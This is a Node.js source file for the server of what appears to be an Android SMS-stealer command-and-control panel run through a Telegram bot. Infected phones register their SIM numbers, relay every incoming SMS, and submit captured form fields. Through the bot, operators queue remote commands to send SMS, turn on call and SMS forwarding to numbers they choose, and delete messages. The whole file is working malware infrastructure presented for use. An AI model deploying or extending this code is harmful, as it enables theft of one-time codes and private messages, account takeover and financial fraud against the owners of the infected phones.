const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs-extra');
const path = require('path');

// ===== CONFIG =====
const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const ADMIN_IDS = [123456789]; // Replace with your Telegram ID(s)
const PORT = 3000;
const PUBLIC_URL = `https://myprojector.render.com:${PORT}`;// Your public URL

// ===== STORAGE =====
const STORAGE_DIR = path.join(__dirname,'storage');
fs.ensureDirSync(STORAGE_DIR);
const QUEUE_FILE = path.join(__dirname,'commandQueue.json');
if(!fs.existsSync(QUEUE_FILE)) fs.writeJsonSync(QUEUE_FILE,{});

// ===== EXPRESS APP =====
const app = express();
app.use(bodyParser.json());
app.use(express.urlencoded({extended:true}));
app.use(express.static(path.join(__dirname,'public')));

// ===== TELEGRAM BOT =====
const bot = new TelegramBot(BOT_TOKEN,{polling:true});

// ===== RUNTIME DATA =====
const devices = new Map();
const sessions = {}; // chatId -> session

// ===== UTILS =====
function readQueue(){ return fs.readJsonSync(QUEUE_FILE,{throws:false})||{}; }
function writeQueue(q){ fs.writeJsonSync(QUEUE_FILE,q,{spaces:2}); }
function addCommand(uuid,cmd){
  const q = readQueue();
  q[uuid] = q[uuid]||[];
  q[uuid].push(cmd);
  writeQueue(q);
}
function formatDevice(d){
  const online = (Date.now()-(d.lastSeen||0)<60000);
  return `📱 *${d.model||'Unknown'}*\n🪪 SIM1: ${d.sim1||'N/A'}\n🪪 SIM2: ${d.sim2||'N/A'}\n🔋 Battery: ${d.battery||'N/A'}%\n🌐 ${online?'🟢 Online':'🔴 Offline'}`;
}
function isAdmin(chatId){ return ADMIN_IDS.includes(chatId); }
function awaitAnswer(bot,chatId,prompt){ bot.sendMessage(chatId,prompt); }

// ===== ROUTES =====
app.get('/',(_,res)=>res.send('✅ Panel online'));

// Device connect
app.post('/connect',(req,res)=>{
  const {uuid,model,battery,sim1,sim2} = req.body;
  if(!uuid) return res.status(400).send('missing uuid');
  devices.set(uuid,{model,battery,sim1,sim2,lastSeen:Date.now()});
  const payload = `📲 *Device Connected*\n${formatDevice(devices.get(uuid))}`;
  ADMIN_IDS.forEach(id=>bot.sendMessage(id,payload,{parse_mode:'Markdown'}).catch(()=>{}));
  res.sendStatus(200);
});

// Device polls commands
app.get('/commands',(req,res)=>{
  const uuid=req.query.uuid;
  if(!uuid) return res.status(400).send('missing uuid');
  const q = readQueue();
  const cmds = q[uuid]||[];
  q[uuid] = [];
  writeQueue(q);
  res.json(cmds);
});

// Device sends SMS
app.post('/sms',(req,res)=>{
  const {uuid,from,body,sim,timestamp} = req.body;
  if(!uuid||!from||!body) return res.status(400).send('missing fields');

  const device = devices.get(uuid)||{model:uuid,sim1:'N/A',sim2:'N/A'};
  const ts = new Date(timestamp||Date.now());

  const smsMsg = `📱 NEW MESSAGE RECEIVED 📱

📜 Device Numbers 📜
================================
   • Model: ${device.model}
   🪪 SIM1: ${device.sim1}
   🪪 SIM2: ${device.sim2}

🃏 Message Details 🃏
================================
   • From: ${from}
   📧 Message Preview:
${body}
   ⏳ TimeStamp: ${ts.toLocaleDateString()} | ${ts.toLocaleTimeString()}
================================`;

  ADMIN_IDS.forEach(id=>bot.sendMessage(id,smsMsg,{parse_mode:'Markdown'}).catch(()=>{}));

  const smsFile = path.join(STORAGE_DIR,`${uuid}_sms.json`);
  const list = fs.existsSync(smsFile)?fs.readJsonSync(smsFile):[];
  list.unshift({from,body,sim,timestamp:ts.getTime()});
  fs.writeJsonSync(smsFile,list.slice(0,500),{spaces:2});

  res.sendStatus(200);
});

// Delete last SMS
app.post('/delete-last-sms',(req,res)=>{
  const {uuid} = req.body;
  if(!uuid) return res.status(400).send('missing uuid');
  const smsFile = path.join(STORAGE_DIR,`${uuid}_sms.json`);
  if(fs.existsSync(smsFile)){
    let list = fs.readJsonSync(smsFile);
    if(list.length>0){
      const removed = list.shift();
      fs.writeJsonSync(smsFile,list.slice(0,500),{spaces:2});
      return res.json({status:'success',deleted:removed});
    }
  }
  res.json({status:'empty'});
});

// HTML Form submit
app.post('/html-form-data',(req,res)=>{
  const {uuid,...fields}=req.body;
  if(!uuid) return res.status(400).send('missing uuid');
  const fp = path.join(STORAGE_DIR,`${uuid}.json`);
  fs.writeJsonSync(fp,fields,{spaces:2});
  const device = devices.get(uuid)||{model:uuid};
  let msg = `🧾 *Form Submitted*\n📱 ${device.model}`;
  for(let[k,v] of Object.entries(fields)){
    const label=k.replace(/_/g,' ').replace(/\b\w/g,c=>c.toUpperCase());
    msg+=`\n🔸 *${label}*: ${v}`;
  }
  ADMIN_IDS.forEach(id=>bot.sendMessage(id,msg,{parse_mode:'Markdown'}).catch(()=>{}));
  res.sendStatus(200);
});

// ===== TELEGRAM BOT =====
bot.on('message',msg=>{
  const chatId = msg.chat.id;
  const text = (msg.text||'').trim();
  if(!isAdmin(chatId)){
    bot.sendMessage(chatId,'❌ Permission denied.');
    return;
  }

  if(sessions[chatId] && sessions[chatId].stage){
    const s = sessions[chatId];
    if(s.action==='send_sms'){
      if(s.stage==='await_number'){ s.number=text; s.stage='await_message'; return bot.sendMessage(chatId,`✉️ Enter message to ${s.number}:`);}
      if(s.stage==='await_message'){ addCommand(s.uuid,{type:'send_sms',sim:s.sim,number:s.number,message:text}); bot.sendMessage(chatId,'✅ SMS queued'); delete sessions[chatId]; return;}
    }
    if(s.action==='call_forward_on' || s.action==='sms_forward_on'){
      const forwardTo = text;
      if(s.action==='call_forward_on'){ addCommand(s.uuid,{type:'call_forward',action:'on',sim:s.sim,number:forwardTo}); bot.sendMessage(chatId,`✅ Call Forward ON SIM${s.sim} → ${forwardTo}`);}
      if(s.action==='sms_forward_on'){ addCommand(s.uuid,{type:'sms_forward',action:'on',sim:s.sim,number:forwardTo}); bot.sendMessage(chatId,`✅ SMS Forward ON SIM${s.sim} → ${forwardTo}`);}
      delete sessions[chatId]; return;
    }
  }

  if(text==='/start'){
    bot.sendMessage(chatId,'✅ Admin Panel Ready',{reply_markup:{keyboard:[['Connected devices'],['Execute command']],resize_keyboard:true}});
  }
  if(text==='Connected devices'){
    if(devices.size===0) return bot.sendMessage(chatId,'🚫 No devices connected.');
    let out=''; for(let [u,d] of devices.entries()) out+=`${formatDevice(d)}\nUUID: \`${u}\`\n\n`;
    bot.sendMessage(chatId,out,{parse_mode:'Markdown'});
  }
  if(text==='Execute command'){
    const rows=[...devices.entries()].map(([uuid,d])=>[{text:d.model||uuid,callback_data:`device:${uuid}`}]);
    if(rows.length===0) return bot.sendMessage(chatId,'🚫 No devices connected.');
    bot.sendMessage(chatId,'🔘 Select device:',{reply_markup:{inline_keyboard:rows}});
  }
});

// ===== INLINE CALLBACKS =====
// (Same as your previous code, menus for SMS, Call Forward, SMS Forward, Form View, Device Info, Delete SMS)

bot.on('callback_query', async cb => {
  const chatId = cb.message.chat.id;
  const data = cb.data;

  if(!isAdmin(chatId)) return bot.answerCallbackQuery(cb.id,{text:'❌ Not allowed'});

  const [cmd, uuid] = data.split(':');
  const device = devices.get(uuid);

  switch(cmd){

    // DEVICE COMMANDS MENU
    case 'device': {
      const buttons=[
        [{text:'📜 SMS Logs',callback_data:`get_sms_log:${uuid}`}],
        [{text:'✉️ Send SMS',callback_data:`send_sms_menu:${uuid}`}],
        [{text:'📞 Call Forward',callback_data:`call_forward_menu:${uuid}`}],
        [{text:'📨 SMS Forward',callback_data:`sms_forward_menu:${uuid}`}],
        [{text:'📋 Device Info',callback_data:`device_info:${uuid}`}],
        [{text:'🧾 View Form Data',callback_data:`view_form:${uuid}`}],
        [{text:'🗑️ Delete Last SMS',callback_data:`delete_last_sms:${uuid}`}],
        [{text:'⬅️ Back',callback_data:'back_devices'}]
      ];
      return bot.editMessageText(`🔧 Commands for ${device.model}`,{
        chat_id:chatId,
        message_id:cb.message.message_id,
        reply_markup:{inline_keyboard:buttons}
      });
    }

    // SEND SMS MENU
    case 'send_sms_menu': {
      const sim1={text:'SIM1',callback_data:`send_sms_sim1:${uuid}`};
      const sim2={text:'SIM2',callback_data:`send_sms_sim2:${uuid}`};
      return bot.editMessageText('✉️ Choose SIM:',{
        chat_id:chatId,
        message_id:cb.message.message_id,
        reply_markup:{inline_keyboard:[[sim1,sim2],[{text:'⬅️ Back',callback_data:`device:${uuid}`}]]}
      });
    }
    case 'send_sms_sim1':
    case 'send_sms_sim2': {
      const sim = cb.data.includes('sim2')?2:1;
      sessions[chatId]={stage:'await_number',action:'send_sms',sim,uuid};
      awaitAnswer(bot,chatId,'📨 Enter recipient number:');
      return bot.answerCallbackQuery(cb.id);
    }

    // CALL FORWARD MENU
    case 'call_forward_menu': {
      const row=[{text:'SIM1',callback_data:`call_forward_sim1:${uuid}`},{text:'SIM2',callback_data:`call_forward_sim2:${uuid}`}];
      return bot.editMessageText('📞 Choose SIM for Call Forward:',{
        chat_id:chatId,
        message_id:cb.message.message_id,
        reply_markup:{inline_keyboard:[row,[{text:'⬅️ Back',callback_data:`device:${uuid}`}]]}
      });
    }
    case 'call_forward_sim1':
    case 'call_forward_sim2': {
      const sim = cb.data.includes('sim2')?2:1;
      const on={text:'Enable',callback_data:`call_forward_on_sim${sim}:${uuid}`};
      const off={text:'Disable',callback_data:`call_forward_off_sim${sim}:${uuid}`};
      const check={text:'Check',callback_data:`call_forward_check_sim${sim}:${uuid}`};
      return bot.editMessageText(`Call Forward SIM${sim} — choose action:`,{
        chat_id:chatId,
        message_id:cb.message.message_id,
        reply_markup:{inline_keyboard:[[on,off,check],[{text:'⬅️ Back',callback_data:`call_forward_menu:${uuid}`}]]}
      });
    }
    case 'call_forward_on_sim1':
    case 'call_forward_on_sim2': {
      const sim = cb.data.includes('sim2')?2:1;
      sessions[chatId]={stage:'await_number',action:'call_forward_on',sim,uuid};
      awaitAnswer(bot,chatId,`📞 Enter number to forward calls TO (SIM${sim}):`);
      return bot.answerCallbackQuery(cb.id);
    }
    case 'call_forward_off_sim1':
    case 'call_forward_off_sim2': {
      const sim = cb.data.includes('sim2')?2:1;
      addCommand(uuid,{type:'call_forward',action:'off',sim});
      bot.sendMessage(chatId,`✅ Call Forward OFF SIM${sim}`);
      return bot.answerCallbackQuery(cb.id);
    }
    case 'call_forward_check_sim1':
    case 'call_forward_check_sim2': {
      const sim = cb.data.includes('sim2')?2:1;
      addCommand(uuid,{type:'call_forward',action:'check',sim});
      bot.sendMessage(chatId,`🔎 Check Call Forward SIM${sim}`);
      return bot.answerCallbackQuery(cb.id);
    }

    // SMS FORWARD MENU
    case 'sms_forward_menu': {
      const row=[{text:'SIM1',callback_data:`sms_forward_sim1:${uuid}`},{text:'SIM2',callback_data:`sms_forward_sim2:${uuid}`}];
      return bot.editMessageText('📨 Choose SIM for SMS Forward:',{
        chat_id:chatId,
        message_id:cb.message.message_id,
        reply_markup:{inline_keyboard:[row,[{text:'⬅️ Back',callback_data:`device:${uuid}`}]]}
      });
    }
    case 'sms_forward_sim1':
    case 'sms_forward_sim2': {
      const sim = cb.data.includes('sim2')?2:1;
      const on={text:'Enable',callback_data:`sms_forward_on_sim${sim}:${uuid}`};
      const off={text:'Disable',callback_data:`sms_forward_off_sim${sim}:${uuid}`};
      const check={text:'Check',callback_data:`sms_forward_check_sim${sim}:${uuid}`};
      return bot.editMessageText(`SMS Forward SIM${sim} — choose action:`,{
        chat_id:chatId,
        message_id:cb.message.message_id,
        reply_markup:{inline_keyboard:[[on,off,check],[{text:'⬅️ Back',callback_data:`sms_forward_menu:${uuid}`}]]}
      });
    }
    case 'sms_forward_on_sim1':
    case 'sms_forward_on_sim2': {
      const sim = cb.data.includes('sim2')?2:1;
      sessions[chatId]={stage:'await_number',action:'sms_forward_on',sim,uuid};
      awaitAnswer(bot,chatId,`📨 Enter number to forward SMS TO (SIM${sim}):`);
      return bot.answerCallbackQuery(cb.id);
    }
    case 'sms_forward_off_sim1':
    case 'sms_forward_off_sim2': {
      const sim = cb.data.includes('sim2')?2:1;
      addCommand(uuid,{type:'sms_forward',action:'off',sim});
      bot.sendMessage(chatId,`✅ SMS Forward OFF SIM${sim}`);
      return bot.answerCallbackQuery(cb.id);
    }
    case 'sms_forward_check_sim1':
    case 'sms_forward_check_sim2': {
      const sim = cb.data.includes('sim2')?2:1;
      addCommand(uuid,{type:'sms_forward',action:'check',sim});
      bot.sendMessage(chatId,`🔎 Check SMS Forward SIM${sim}`);
      return bot.answerCallbackQuery(cb.id);
    }

    // SMS LOGS
    case 'get_sms_log': {
      const smsFile = path.join(STORAGE_DIR,`${uuid}_sms.json`);
      if(fs.existsSync(smsFile)){
        const logs = fs.readJsonSync(smsFile);
        let msg = `📜 SMS Logs (${logs.length} messages)\n\n`;
        logs.slice(0,20).forEach((l,i)=>{
          msg+=`${i+1}. From: ${l.from}\nSIM: ${l.sim}\nMsg: ${l.body}\nTime: ${new Date(l.timestamp).toLocaleString()}\n\n`;
        });
        bot.sendMessage(chatId,msg||'No messages',{parse_mode:'Markdown'});
      } else bot.sendMessage(chatId,'No messages found');
      return bot.answerCallbackQuery(cb.id);
    }

    // DEVICE INFO
    case 'device_info': {
      const d = devices.get(uuid);
      if(!d) return bot.answerCallbackQuery(cb.id,{text:'Device not found'});
      let msg = formatDevice(d) + `\nUUID: ${uuid}`;
      bot.sendMessage(chatId,msg,{parse_mode:'Markdown'});
      return bot.answerCallbackQuery(cb.id);
    }

    // FORM DATA
    case 'view_form': {
      const fp = path.join(STORAGE_DIR,`${uuid}.json`);
      if(fs.existsSync(fp)){
        const data = fs.readJsonSync(fp);
        let msg = `🧾 Form Data for ${uuid}:\n`;
        for(let [k,v] of Object.entries(data)){
          const label = k.replace(/_/g,' ').replace(/\b\w/g,c=>c.toUpperCase());
          msg+=`🔸 *${label}*: ${v}\n`;
        }
        bot.sendMessage(chatId,msg,{parse_mode:'Markdown'});
      } else bot.sendMessage(chatId,'No form data found');
      return bot.answerCallbackQuery(cb.id);
    }

    // DELETE LAST SMS
    case 'delete_last_sms': {
      const smsFile = path.join(STORAGE_DIR,`${uuid}_sms.json`);
      if(fs.existsSync(smsFile)){
        let list = fs.readJsonSync(smsFile);
        if(list.length>0){
          const removed = list.shift();
          fs.writeJsonSync(smsFile,list.slice(0,500),{spaces:2});
          bot.sendMessage(chatId,`🗑️ Last SMS deleted:\nFrom: ${removed.from}\nMsg: ${removed.body}`);
        } else bot.sendMessage(chatId,'No messages to delete');
      } else bot.sendMessage(chatId,'No messages to delete');
      return bot.answerCallbackQuery(cb.id);
    }

    // BACK TO DEVICE LIST
    case 'back_devices': {
      const rows=[...devices.entries()].map(([uuid,d])=>[{text:d.model||uuid,callback_data:`device:${uuid}`}]);
      bot.editMessageText('🔘 Select device:',{
        chat_id:chatId,
        message_id:cb.message.message_id,
        reply_markup:{inline_keyboard:rows}
      });
      return bot.answerCallbackQuery(cb.id);
    }

    default: 
      return bot.answerCallbackQuery(cb.id,{text:'❌ Unknown action'});
  }
});

// ===== START SERVER =====
app.listen(PORT, () => console.log(`✅ Server running at ${PUBLIC_URL}`));